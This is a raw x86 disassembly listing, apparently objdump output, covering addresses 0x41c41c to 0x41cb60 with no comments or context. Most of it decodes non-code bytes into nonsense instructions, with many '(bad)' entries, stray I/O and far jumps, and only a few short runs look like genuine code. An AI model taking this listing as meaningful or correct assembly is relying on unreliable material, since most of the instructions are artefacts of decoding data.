  41c41c:	pop    ss
  41c41d:	and    edi,DWORD PTR [ebx-0x76a99d1a]
  41c423:	retf   
  41c424:	fs xchg edi,eax
  41c426:	pop    edx
  41c427:	lahf   
  41c428:	jg     0x41c42c
  41c42a:	mov    bh,0xb9
  41c42c:	mov    ch,BYTE PTR [edx+0x13]
  41c42f:	stc    
  41c430:	pushf  
  41c431:	out    dx,eax
  41c432:	fisubr WORD PTR [ebx]
  41c434:	iret   
  41c435:	dec    ebp
  41c436:	sbb    BYTE PTR [ebx-0x34],ah
  41c439:	or     DWORD PTR [ebp+0x6e901249],ecx
  41c43f:	jns    0x41c4ad
  41c441:	(bad)
  41c444:	mov    edi,edx
  41c446:	xchg   edx,eax
  41c447:	jmp    0x41c3ef
  41c449:	push   ds
  41c44a:	push   ss
  41c44b:	add    DWORD PTR [ecx+0x4a],edi
  41c44e:	imul   ecx,DWORD PTR [ecx+0x30e9f445],0x2
  41c455:	add    BYTE PTR [eax],al
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c44b
  41c464:	xchg   edx,eax
  41c465:	pop    edi
  41c466:	ds push 0x10787fec
  41c46c:	jle    0x41c4e6
  41c46e:	js     0x41c4e6
  41c470:	sub    eax,0xfdead955
  41c475:	sbb    DWORD PTR [edi],edx
  41c477:	mov    al,ds:0xcda884c6
  41c47c:	adc    ebx,DWORD PTR [ebx]
  41c47e:	add    bh,BYTE PTR [ecx+0x316d18a1]
  41c484:	ror    ebp,0x86
  41c487:	lods   eax,DWORD PTR ds:[esi]
  41c488:	test   BYTE PTR [esi],dl
  41c48a:	mov    ebx,0x2f0da2fe
  41c48f:	rol    DWORD PTR [ebp+0x5e0455aa],1
  41c495:	xchg   edi,eax
  41c496:	pop    esp
  41c497:	jl     0x41c474
  41c499:	xchg   ebp,eax
  41c49a:	call   DWORD PTR [ecx]
  41c49c:	and    BYTE PTR [edx-0x24aa69a8],cl
  41c4a2:	sub    DWORD PTR [ebp-0x3f2a15da],ebp
  41c4a8:	scas   al,BYTE PTR es:[edi]
  41c4a9:	jnp    0x41c42f
  41c4ab:	jg     0x41c506
  41c4ad:	xor    al,al
  41c4af:	aad    0xd
  41c4b1:	or     ch,BYTE PTR ds:0x3da5e993
  41c4b7:	add    BYTE PTR [ebx+edx*8],0xf8
  41c4bb:	add    DWORD PTR ds:0x8e87d378,edx
  41c4c1:	enter  0x7633,0x9f
  41c4c5:	dec    ebx
  41c4c6:	cdq    
  41c4c7:	test   BYTE PTR [eax+0xd3c8786],ah
  41c4cd:	xchg   BYTE PTR [eax],dh
  41c4cf:	push   esp
  41c4d0:	xchg   BYTE PTR [ebx+0x44],cl
  41c4d3:	cmp    DWORD PTR [ebx+0x1757559b],ebx
  41c4d9:	push   ebp
  41c4da:	inc    esp
  41c4db:	jo     0x41c4a6
  41c4dd:	add    dl,bh
  41c4df:	jne    0x41c47a
  41c4e1:	rol    dl,cl
  41c4e3:	cs pop esi
  41c4e5:	fisubr WORD PTR [edx]
  41c4e7:	out    0x4e,al
  41c4e9:	xor    BYTE PTR [edx],dl
  41c4eb:	jle    0x41c51a
  41c4ed:	mul    BYTE PTR [esi+0x407ff0e7]
  41c4f3:	stos   DWORD PTR es:[edi],eax
  41c4f4:	mov    DWORD PTR [esi],edx
  41c4f6:	aaa    
  41c4f7:	add    BYTE PTR ds:0xaae3ac9f,al
  41c4fd:	pop    esp
  41c4fe:	push   ds
  41c4ff:	pop    es
  41c500:	ret    
  41c501:	cwde   
  41c502:	mov    ds:0x3a1a560b,eax
  41c507:	das    
  41c508:	mov    ah,0xa4
  41c50a:	push   edx
  41c50b:	stos   BYTE PTR es:[edi],al
  41c50c:	and    BYTE PTR [edi-0x2a],dl
  41c50f:	outs   dx,DWORD PTR ds:[esi]
  41c510:	ss es jecxz 0x41c4ac
  41c514:	dec    ebx
  41c515:	ss retf 
  41c517:	cmp    ebp,ecx
  41c519:	out    0x42,al
  41c51b:	jp     0x41c4b2
  41c51d:	rol    BYTE PTR [eax-0x33df1e2d],1
  41c523:	cmp    al,0x1c
  41c525:	mov    ecx,0xd4f03f7a
  41c52a:	sbb    BYTE PTR [esi-0x642fd7d2],0xb3
  41c531:	push   edi
  41c532:	and    BYTE PTR [eax+0x6681b989],0x7e
  41c539:	stos   DWORD PTR es:[edi],eax
  41c53a:	int    0x8e
  41c53c:	sbb    cl,BYTE PTR [ebx+0x79]
  41c53f:	stc    
  41c540:	jl     0x41c559
  41c542:	data16 out 0x52,al
  41c545:	adc    ebx,esp
  41c547:	push   esp
  41c548:	dec    ebx
  41c549:	adc    al,0x92
  41c54b:	push   ss
  41c54c:	scas   al,BYTE PTR es:[edi]
  41c54d:	in     al,dx
  41c54e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c54f:	or     al,0x5
  41c551:	adc    al,0xd7
  41c553:	hlt    
  41c554:	test   DWORD PTR [ecx-0x37],0x2533a07
  41c55b:	pusha  
  41c55c:	mov    ds:0xebdcb2b7,al
  41c561:	popa   
  41c562:	repnz lods al,BYTE PTR ds:[esi]
  41c564:	jmp    DWORD PTR [ebx-0x3c26114]
  41c56a:	jno    0x41c587
  41c56c:	loope  0x41c4fa
  41c56e:	or     al,BYTE PTR [edi-0x6488cabe]
  41c574:	adc    BYTE PTR [ebx+0x1d],bl
  41c577:	push   cs
  41c578:	jmp    0xaaab87c6
  41c57d:	retf   
  41c57e:	xlat   BYTE PTR ds:[ebx]
  41c57f:	add    al,0x53
  41c581:	fdivr  st(3),st
  41c583:	mov    esp,DWORD PTR [ebx]
  41c585:	hlt    
  41c586:	pop    ecx
  41c587:	es loopne 0x41c546
  41c58a:	mov    eax,0xb765f
  41c58f:	push   0xffffff81
  41c591:	and    DWORD PTR [edi+0xb],ecx
  41c594:	push   0x4b
  41c596:	fdiv   DWORD PTR [esi+0x24]
  41c599:	and    dh,BYTE PTR [edi]
  41c59b:	inc    ecx
  41c59c:	fwait
  41c59d:	pusha  
  41c59e:	mov    dh,0x31
  41c5a0:	jmp    0x8158:0x8d84947c
  41c5a7:	push   eax
  41c5a8:	inc    eax
  41c5a9:	mov    ch,0x32
  41c5ab:	push   esi
  41c5ac:	xor    DWORD PTR [edi+0x56],0x9e487ac8
  41c5b3:	mov    ah,0x5d
  41c5b5:	inc    edx
  41c5b6:	mov    dh,0x8e
  41c5b8:	scas   eax,DWORD PTR es:[edi]
  41c5b9:	in     al,0x3a
  41c5bb:	(bad)  
  41c5bc:	dec    esi
  41c5bd:	xor    ebp,DWORD PTR [edi]
  41c5bf:	mov    dl,0x28
  41c5c1:	mov    bh,0x7d
  41c5c3:	mov    ebp,0x9dc8b27e
  41c5c8:	mov    bh,0xd2
  41c5ca:	inc    DWORD PTR [ebx+0x5d]
  41c5cd:	pop    eax
  41c5ce:	sbb    al,0x85
  41c5d0:	loop   0x41c649
  41c5d2:	adc    ecx,ebp
  41c5d4:	(bad)  
  41c5d5:	js     0x41c5a1
  41c5d7:	aad    0xa2
  41c5d9:	pop    edx
  41c5da:	jle    0x41c573
  41c5dc:	mov    ds:0x8f7bc44c,al
  41c5e1:	xor    edi,ecx
  41c5e3:	in     al,dx
  41c5e4:	or     ch,dl
  41c5e6:	sbb    eax,ebx
  41c5e8:	xchg   ebp,eax
  41c5e9:	xor    al,cl
  41c5eb:	cmp    edx,DWORD PTR [ebx]
  41c5ed:	add    DWORD PTR [eax+0x8],esi
  41c5f0:	mov    edi,DWORD PTR [esi]
  41c5f2:	adc    cl,bh
  41c5f4:	cmp    eax,0xf00c379
  41c5f9:	mov    DWORD PTR [ebx],ebx
  41c5fb:	enter  0xa9ec,0x82
  41c5ff:	sahf   
  41c600:	cli    
  41c601:	lods   eax,DWORD PTR ds:[esi]
  41c602:	int3   
  41c603:	sbb    al,0x41
  41c605:	xchg   ebx,eax
  41c606:	xor    DWORD PTR [ebx+edx*2],ebx
  41c609:	retf   0x53ce
  41c60c:	dec    ecx
  41c60d:	ins    BYTE PTR es:[edi],dx
  41c60e:	inc    edx
  41c60f:	js     0x41c690
  41c611:	(bad)  
  41c613:	push   edi
  41c614:	out    dx,eax
  41c615:	adc    dl,BYTE PTR [edi-0x2be08b02]
  41c61b:	icebp  
  41c61c:	fst    DWORD PTR [edx-0x45]
  41c61f:	xchg   edx,eax
  41c620:	fldenv [ecx-0x48caaae2]
  41c626:	lds    esp,FWORD PTR ds:0xbaa481cb
  41c62c:	hlt    
  41c62d:	ins    BYTE PTR es:[edi],dx
  41c62e:	mov    ebp,DWORD PTR [ebx-0x45fc05f8]
  41c634:	ret    0xd498
  41c637:	aaa    
  41c638:	push   cs
  41c639:	enter  0x846e,0xb6
  41c63d:	aad    0xf6
  41c63f:	or     eax,0x2f7548b0
  41c644:	xor    eax,0x9c4874a7
  41c649:	fidivr DWORD PTR [ebx-0x68]
  41c64c:	lds    edx,FWORD PTR [esi]
  41c64e:	xchg   esp,eax
  41c64f:	(bad)  
  41c650:	xchg   ebx,eax
  41c651:	pop    ss
  41c652:	adc    eax,0xbce878de
  41c657:	dec    ebx
  41c658:	push   ebx
  41c659:	mov    dh,0x54
  41c65b:	in     eax,dx
  41c65c:	push   edx
  41c65d:	in     al,0xa5
  41c65f:	fnstenv [ecx-0x6d]
  41c662:	clc    
  41c663:	push   cs
  41c664:	sbb    ch,bh
  41c666:	mov    eax,esi
  41c668:	and    al,0x86
  41c66a:	jmp    0x516e98d3
  41c66f:	mov    cs,edx
  41c671:	pop    ds
  41c672:	xchg   ebp,eax
  41c673:	xor    DWORD PTR [ebp+0x67],ebx
  41c676:	mov    esi,0x8983de2
  41c67b:	in     al,0x13
  41c67d:	out    0x13,al
  41c67f:	aad    0xb3
  41c681:	mov    dh,0x40
  41c683:	or     eax,0x33efb8c5
  41c688:	fisttp DWORD PTR [ebp+0x1803f045]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x8a4a773e,eax
  41c6cc:	rcl    DWORD PTR [edx+0x787ff100],1
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c703
  41c6d7:	test   BYTE PTR [esi+eiz*2],dh
  41c6da:	(bad)  
  41c6db:	mov    bh,0x66
  41c6dd:	xor    cl,bh
  41c6df:	inc    edi
  41c6e0:	call   0xa265d12
  41c6e5:	call   0x49ed859b
  41c6ea:	sbb    BYTE PTR [ecx+0x14322d15],ch
  41c6f0:	mov    BYTE PTR ds:[ecx-0x56d52243],bh
  41c6f7:	in     al,0x96
  41c6f9:	hlt    
  41c6fa:	lds    ecx,FWORD PTR [ebx]
  41c6fc:	sub    ah,BYTE PTR gs:[edi-0x40f57d0b]
  41c703:	mul    BYTE PTR [edi]
  41c705:	xchg   ebp,eax
  41c706:	push   es
  41c707:	xlat   BYTE PTR ds:[ebx]
  41c708:	out    dx,al
  41c709:	jmp    0x379b:0x37ccc7d7
  41c710:	ins    BYTE PTR es:[edi],dx
  41c711:	(bad)  
  41c713:	and    bh,al
  41c715:	div    DWORD PTR [ebx+ecx*1+0x15]
  41c719:	push   esi
  41c71a:	add    eax,0x56518716
  41c71f:	xchg   edi,eax
  41c720:	xchg   ebx,eax
  41c721:	imul   edx,DWORD PTR [edi+0x17e6649e],0xfffffffe
  41c728:	sub    BYTE PTR [ebp+0x1d],dh
  41c72b:	mov    bl,0x53
  41c72d:	mov    dh,0xee
  41c72f:	repnz cwde 
  41c731:	mov    edx,cs
  41c733:	icebp  
  41c734:	inc    esp
  41c735:	dec    ebx
  41c736:	mov    esp,0x9792ce99
  41c73b:	mov    edi,0x45014a4
  41c740:	sub    bl,BYTE PTR ds:[eax-0x71]
  41c744:	popf   
  41c745:	mov    esp,0xc9471af2
  41c74a:	cmc    
  41c74b:	sub    ebp,DWORD PTR [eax-0x5fd28c4c]
  41c751:	outs   dx,DWORD PTR ds:[esi]
  41c752:	(bad)  
  41c753:	sar    DWORD PTR [ecx],0x2e
  41c756:	imul   esi,DWORD PTR [ebx+0xedbfefe],0x3
  41c75d:	adc    al,0xbf
  41c75f:	sub    DWORD PTR [edi+0xc],edi
  41c762:	test   BYTE PTR ds:0x8a0c8634,cl
  41c768:	mov    esi,0xfa24069c
  41c76d:	scas   eax,DWORD PTR es:[edi]
  41c76e:	mov    dl,0xc5
  41c770:	sbb    bh,BYTE PTR [edi+0xa]
  41c773:	ror    al,cl
  41c775:	inc    edx
  41c776:	and    DWORD PTR [edi],ebx
  41c778:	mov    ds:0x7a1a6391,eax
  41c77d:	mov    al,0x5b
  41c77f:	sbb    eax,0xbd15946f
  41c784:	inc    edi
  41c785:	mov    ch,0xc2
  41c787:	xchg   esp,eax
  41c788:	mov    al,0x1d
  41c78a:	inc    ebp
  41c78b:	(bad)  
  41c78c:	push   ebx
  41c78d:	aas    
  41c78e:	nop
  41c78f:	int    0x3d
  41c791:	sbb    eax,0x69ad1815
  41c796:	(bad)  
  41c797:	icebp  
  41c798:	mov    ch,0x21
  41c79a:	jno    0x41c7d9
  41c79c:	fst    QWORD PTR [ebx]
  41c79e:	pop    ecx
  41c79f:	idiv   BYTE PTR [ebx+0x17]
  41c7a2:	and    ah,ch
  41c7a4:	loop   0x41c7c3
  41c7a6:	or     eax,0xa3623301
  41c7ab:	call   0x35bf:0x549b0ea9
  41c7b2:	xchg   esi,eax
  41c7b3:	cli    
  41c7b4:	dec    esi
  41c7b5:	mov    DWORD PTR [edi+edi*8+0x4a85b81b],eax
  41c7bc:	jg     0x41c79c
  41c7be:	cmp    al,0x9d
  41c7c0:	jnp    0x41c74a
  41c7c2:	push   0x2ef5ca0a
  41c7c7:	jmp    0x41c78a
  41c7c9:	jno    0x41c760
  41c7cb:	fdivr  st,st(4)
  41c7cd:	repz and edi,DWORD PTR [edx+0x7c]
  41c7d1:	loop   0x41c75c
  41c7d3:	adc    al,0x98
  41c7d5:	sub    cl,BYTE PTR [ebx-0x27]
  41c7d8:	sahf   
  41c7d9:	adc    al,0xe1
  41c7db:	imul   eax,DWORD PTR [esi],0xaaabebad
  41c7e1:	fmul   QWORD PTR [edx]
  41c7e3:	sub    eax,0x9ac8395
  41c7e8:	imul   ebx,DWORD PTR cs:[esi],0x50
  41c7ec:	pop    edi
  41c7ed:	into   
  41c7ee:	sar    BYTE PTR [ecx],cl
  41c7f0:	sbb    BYTE PTR [ecx+0x753da72],cl
  41c7f6:	sahf   
  41c7f7:	inc    ecx
  41c7f8:	cmc    
  41c7f9:	mov    cl,0xeb
  41c7fb:	mov    al,0x59
  41c7fd:	jmp    0x41c783
  41c7ff:	test   ecx,esp
  41c801:	mov    esp,0x7ce49d8b
  41c806:	xor    ebp,DWORD PTR [eax-0x2e]
  41c809:	cwde   
  41c80a:	and    eax,0x7d9344dd
  41c80f:	dec    eax
  41c810:	xor    bh,BYTE PTR [ecx]
  41c812:	push   esi
  41c813:	int    0xac
  41c815:	pop    ebx
  41c816:	call   0x77a3:0xcc86c66
  41c81d:	cwde   
  41c81e:	shr    dl,1
  41c820:	(bad)  
  41c821:	in     al,0xfe
  41c823:	ficomp DWORD PTR [ebp+0x5025582d]
  41c829:	repnz outs dx,BYTE PTR ds:[esi]
  41c82b:	shr    DWORD PTR [ecx+0x7f],0x67
  41c82f:	inc    edi
  41c830:	loop   0x41c7b7
  41c832:	mov    WORD PTR [esi],?
  41c834:	aas    
  41c835:	and    cl,ah
  41c837:	cmp    ecx,DWORD PTR [eax-0x7869040b]
  41c83d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c83e:	add    BYTE PTR [edi-0x43],al
  41c841:	dec    esi
  41c842:	dec    ebx
  41c843:	mov    ecx,?
  41c845:	pushf  
  41c846:	pop    ecx
  41c847:	sub    eax,0x2c20d6fd
  41c84c:	push   ss
  41c84d:	out    0xf1,eax
  41c84f:	jl     0x41c7e7
  41c851:	cmp    ah,cl
  41c853:	ret    0x2468
  41c856:	or     DWORD PTR [ecx-0x4e],esp
  41c859:	es add eax,0xe4a1a3fd
  41c85f:	lock adc al,0x6d
  41c862:	scas   eax,DWORD PTR es:[edi]
  41c863:	in     al,0x5c
  41c865:	mov    eax,0x9b775442
  41c86a:	in     al,0xb
  41c86c:	into   
  41c86d:	iret   
  41c86e:	shl    BYTE PTR [eax],1
  41c870:	inc    edi
  41c871:	push   es
  41c872:	push   eax
  41c873:	add    ch,bh
  41c875:	mov    edi,DWORD PTR [esi]
  41c877:	mov    esi,DWORD PTR [ebx]
  41c879:	sbb    al,0xf1
  41c87b:	mov    eax,ds:0x2b1cfff1
  41c880:	js     0x41c8c6
  41c882:	jno    0x41c879
  41c884:	xor    dh,BYTE PTR ds:0x154927af
  41c88a:	xor    DWORD PTR [ecx-0x26],0x81ce805d
  41c891:	jne    0x41c838
  41c893:	inc    esi
  41c894:	xchg   edx,eax
  41c895:	loopne 0x41c868
  41c897:	div    BYTE PTR ds:0x4d419dc4
  41c89d:	lods   eax,DWORD PTR ds:[esi]
  41c89e:	nop
  41c89f:	mov    al,ds:0xffc4584a
  41c8a4:	je     0x41c876
  41c8a6:	xchg   esi,eax
  41c8a7:	xor    eax,0x5ddf0d4a
  41c8ac:	jo     0x41c8a1
  41c8ae:	je     0x41c873
  41c8b0:	bound  ebp,QWORD PTR [ecx+0x76]
  41c8b3:	or     eax,0x3b7cd4df
  41c8b8:	ror    DWORD PTR [edx],1
  41c8ba:	(bad)  [edi+0xbbf50a4]
  41c8c0:	xor    BYTE PTR [eax+0x26],ch
  41c8c3:	dec    ebp
  41c8c4:	(bad)  
  41c8c5:	cld    
  41c8c6:	aam    0x1b
  41c8c8:	shl    DWORD PTR [edi],0x71
  41c8cb:	jmp    0xbc7f1c4e
  41c8d0:	out    dx,al
  41c8d1:	cmc    
  41c8d2:	fist   WORD PTR [ebp-0x5f]
  41c8d5:	xchg   esp,eax
  41c8d7:	cdq    
  41c8d8:	cli    
  41c8d9:	inc    edi
  41c8da:	outs   dx,DWORD PTR ds:[esi]
  41c8db:	pop    esi
  41c8dc:	out    0x5d,al
  41c8de:	push   edx
  41c8df:	mov    ebp,0xff7e09e7
  41c8e4:	call   0x74ff2e81
  41c8e9:	dec    ecx
  41c8ea:	aaa    
  41c8eb:	inc    esi
  41c8ec:	push   cs
  41c8ed:	add    al,0x4a
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	xchg   BYTE PTR [edi],dl
  41c911:	(bad)  
  41c912:	scas   al,BYTE PTR es:[edi]
  41c913:	sbb    bh,dh
  41c915:	jg     0x41c98f
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c909
  41c91c:	cdq    
  41c91d:	fnsave [ebx]
  41c91f:	test   BYTE PTR [ebx+0x3f],ch
  41c922:	and    eax,0xf4e27b56
  41c927:	loop   0x41c8e7
  41c929:	sbb    eax,0xf3eeaee0
  41c92e:	div    DWORD PTR ds:0xaac377ae
  41c934:	jno    0x41c8e2
  41c936:	jge    0x41c95a
  41c938:	scas   al,BYTE PTR es:[edi]
  41c939:	div    cl
  41c93b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41c93d:	add    dh,bh
  41c93f:	outs   dx,BYTE PTR ds:[esi]
  41c940:	(bad)  
  41c941:	mov    bh,bl
  41c943:	outs   dx,BYTE PTR ds:[esi]
  41c945:	sbb    al,0x9c
  41c947:	mov    ah,0xa8
  41c949:	and    bl,BYTE PTR [edx-0x18d76d02]
  41c94f:	(bad)  
  41c950:	mov    eax,0xceef13c
  41c955:	fs ret 0xa3bf
  41c959:	xor    al,BYTE PTR [esi+eiz*4-0x151c0828]
  41c960:	scas   al,BYTE PTR es:[edi]
  41c961:	int    0x5a
  41c963:	pop    ebx
  41c964:	push   esp
  41c965:	sti    
  41c966:	inc    edi
  41c967:	(bad)  
  41c969:	scas   al,BYTE PTR es:[edi]
  41c96a:	dec    esi
  41c96b:	lods   eax,DWORD PTR ds:[esi]
  41c96c:	outs   dx,BYTE PTR ds:[esi]
  41c96d:	xchg   edx,eax
  41c96e:	sub    al,0x3
  41c970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c971:	push   ecx
  41c972:	sbb    ch,BYTE PTR [edx+0x3a537c85]
  41c978:	xchg   ebp,eax
  41c979:	iret   
  41c97a:	pop    ecx
  41c97b:	mov    bh,0xcd
  41c97d:	cdq    
  41c97e:	dec    eax
  41c97f:	jecxz  0x41c9ed
  41c981:	out    0x54,al
  41c983:	push   edx
  41c984:	jp     0x41c9fc
  41c986:	call   0xacc9ff8f
  41c98b:	hlt    
  41c98c:	xor    BYTE PTR [eax],cl
  41c98e:	imul   ebp,DWORD PTR [ebx+esi*2+0x3d]
  41c993:	adc    DWORD PTR [edi],edx
  41c995:	popf   
  41c996:	add    al,0x3
  41c998:	xchg   ah,al
  41c99a:	inc    edi
  41c99b:	sbb    al,0xc8
  41c99d:	stos   BYTE PTR es:[edi],al
  41c99e:	add    al,dh
  41c9a0:	pop    ds
  41c9a1:	lods   eax,DWORD PTR ds:[esi]
  41c9a2:	out    dx,al
  41c9a3:	enter  0x8a2d,0x90
  41c9a7:	jmp    0x5bac4b4f
  41c9ac:	dec    esi
  41c9ad:	or     BYTE PTR [esi+0x36e38ece],bh
  41c9b3:	retf   
  41c9b4:	push   0x32e714d9
  41c9b9:	nop
  41c9ba:	adc    BYTE PTR [edx],ch
  41c9bc:	inc    esi
  41c9bd:	inc    edx
  41c9be:	mov    ds:0xa93f086a,eax
  41c9c3:	sar    esi,1
  41c9c5:	pushf  
  41c9c6:	or     esp,eax
  41c9c8:	or     al,0x1c
  41c9ca:	jmp    0x91e2:0xf25d646c
  41c9d1:	sti    
  41c9d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9d3:	jmp    0xe7419956
  41c9d8:	bound  ebx,QWORD PTR [ecx+0x77]
  41c9db:	cs sbb al,0xb
  41c9de:	or     BYTE PTR [ecx-0x7c],dh
  41c9e1:	call   0x8bfb:0xddd1946
  41c9e8:	jge    0x41c9de
  41c9ea:	mov    ecx,0xf0904cc9
  41c9ef:	add    ch,al
  41c9f1:	loop   0x41ca16
  41c9f3:	test   al,0x7e
  41c9f5:	ss jle 0x41ca57
  41c9f8:	iret   
  41c9f9:	and    eax,DWORD PTR [ecx]
  41c9fb:	pop    ebp
  41c9fc:	push   0x51
  41c9fe:	mov    ds:0x21b17c9,al
  41ca03:	xor    eax,DWORD PTR [edi+0x1d]
  41ca06:	into   
  41ca07:	push   ecx
  41ca08:	push   0xffffffa4
  41ca0a:	xor    ecx,ecx
  41ca0c:	jne    0x41ca5c
  41ca0e:	daa    
  41ca0f:	ss out 0x60,al
  41ca12:	jbe    0x41ca55
  41ca14:	push   esp
  41ca15:	push   esp
  41ca16:	jnp    0x41ca5d
  41ca18:	xor    BYTE PTR [eax-0x56],bl
  41ca1b:	adc    al,BYTE PTR [ebx]
  41ca1d:	xchg   edx,eax
  41ca1e:	mov    al,BYTE PTR [ebp+ecx*1+0x6d]
  41ca22:	or     edi,DWORD PTR [ecx+0x6c7be87c]
  41ca28:	out    0xa6,al
  41ca2a:	retf   
  41ca2b:	ret    
  41ca2c:	xor    eax,0x4cfce1d1
  41ca31:	in     al,dx
  41ca32:	dec    eax
  41ca33:	aas    
  41ca34:	ja     0x41ca92
  41ca36:	push   edx
  41ca37:	nop
  41ca38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca39:	ins    BYTE PTR es:[edi],dx
  41ca3a:	(bad)  
  41ca3b:	fidivr WORD PTR [ebx-0xb]
  41ca3e:	call   0x3441:0xaceb4873
  41ca45:	dec    esp
  41ca46:	test   al,0xeb
  41ca48:	cdq    
  41ca49:	data16 es fsub st(6),st
  41ca4d:	pop    ecx
  41ca4e:	ret    
  41ca4f:	cld    
  41ca50:	xor    DWORD PTR [esi],ebp
  41ca52:	daa    
  41ca53:	xchg   ebp,eax
  41ca54:	data16 xor al,0xe3
  41ca57:	jns    0x41caa6
  41ca59:	xor    edx,edi
  41ca5b:	imul   eax,DWORD PTR [edx+0x1c7724a8],0x33
  41ca62:	push   edx
  41ca63:	xchg   ebx,eax
  41ca64:	sub    BYTE PTR [ebx],0xd4
  41ca67:	mov    ds:0xd998ab4a,eax
  41ca6c:	xchg   BYTE PTR [ebx+esi*4+0x2ffc4836],bl
  41ca73:	jl     0x41ca21
  41ca75:	scas   eax,DWORD PTR es:[edi]
  41ca76:	dec    esi
  41ca77:	stc    
  41ca78:	popa   
  41ca79:	mov    cl,0x8d
  41ca7b:	add    ebp,DWORD PTR [ebp+0x3c]
  41ca7e:	rcr    DWORD PTR [edx],cl
  41ca80:	cmp    al,0xaa
  41ca82:	test   eax,0xd76813aa
  41ca87:	popf   
  41ca88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca89:	cmp    al,0xfe
  41ca8b:	mov    dl,0x1b
  41ca8d:	idiv   DWORD PTR [ebx]
  41ca8f:	push   ds
  41ca90:	jns    0x41caa4
  41ca92:	fmul   DWORD PTR [esi-0x2e]
  41ca95:	loopne 0x41ca50
  41ca97:	xchg   esi,eax
  41ca98:	sub    ecx,DWORD PTR [ebx+ebx*8+0x50]
  41ca9c:	ret    
  41ca9d:	jbe    0x41cb12
  41ca9f:	xrelease xchg BYTE PTR [edi+0x1347b414],cl
  41caa6:	mov    esp,0xb6be7c3d
  41caab:	adc    BYTE PTR [esi],cl
  41caad:	mov    edx,0x3d7d7b15
  41cab2:	scas   al,BYTE PTR es:[edi]
  41cab3:	mov    ch,0xba
  41cab5:	sub    eax,0xc81f4ac4
  41caba:	cli    
  41cabb:	lods   al,BYTE PTR ds:[esi]
  41cabc:	add    al,0x76
  41cabe:	fld    DWORD PTR [ecx*4-0xf733d05]
  41cac5:	and    eax,0x704248bf
  41caca:	call   0x908cfe2e
  41cacf:	pop    ebx
  41cad0:	mov    ecx,eax
  41cad2:	shl    DWORD PTR [eax],cl
  41cad4:	dec    ebp
  41cad5:	je     0x41cb07
  41cad7:	das    
  41cad8:	shl    BYTE PTR [edi-0x4a],0x89
  41cadc:	inc    eax
  41cadd:	xlat   BYTE PTR ds:[ebx]
  41cade:	(bad)  
  41cadf:	adc    bh,dl
  41cae1:	in     al,dx
  41cae2:	mov    edx,ds
  41cae4:	lds    edx,FWORD PTR [edi-0x74303692]
  41caea:	jns    0x41cad2
  41caec:	xchg   edi,eax
  41caed:	and    al,0x0
  41caef:	inc    edx
  41caf0:	mov    WORD PTR [ebx+0x5b],gs
  41caf3:	dec    edi
  41caf4:	pop    es
  41caf5:	push   esp
  41caf6:	jno    0x41cb47
  41caf8:	je     0x41cada
  41cafa:	(bad)  
  41cafb:	test   dh,0x27
  41cafe:	jbe    0x41cb4a
  41cb00:	xchg   esi,eax
  41cb01:	or     DWORD PTR [ebp+0x65ba64a6],esi
  41cb07:	repz (bad) 
  41cb09:	ja     0x41cb45
  41cb0b:	dec    ebp
  41cb0c:	jb     0x41cb73
  41cb0e:	and    BYTE PTR [ecx+ebx*8],bl
  41cb11:	mov    bh,0x4d
  41cb13:	loopne 0x41cb35
  41cb15:	or     dl,BYTE PTR ds:0x94652472
  41cb1b:	popf   
  41cb1c:	jmp    0x698ac074
  41cb21:	push   0x45
  41cb23:	fstp   TBYTE PTR [edi+0x16]
  41cb26:	cwde   
  41cb27:	rcl    BYTE PTR [eax],cl
  41cb29:	in     al,dx
  41cb2a:	add    DWORD PTR [edi+ebp*4],ebx
  41cb2d:	xchg   edi,eax
  41cb2e:	xchg   ebx,eax
  41cb2f:	mov    ah,0xbe
  41cb31:	cmp    ebp,edx
  41cb33:	pop    esi
  41cb34:	jmp    0x41cd69
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0xbe306037
  41cb47:	stos   BYTE PTR es:[edi],al
  41cb48:	xchg   edi,eax
  41cb49:	xor    ch,dh
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cb17
  41cb52:	(bad)  
  41cb53:	push   0xffffffe6
  41cb55:	sub    eax,0x5c4fcca0
  41cb5a:	add    bh,BYTE PTR ds:0x54674594
  41cb60:	push   ecx
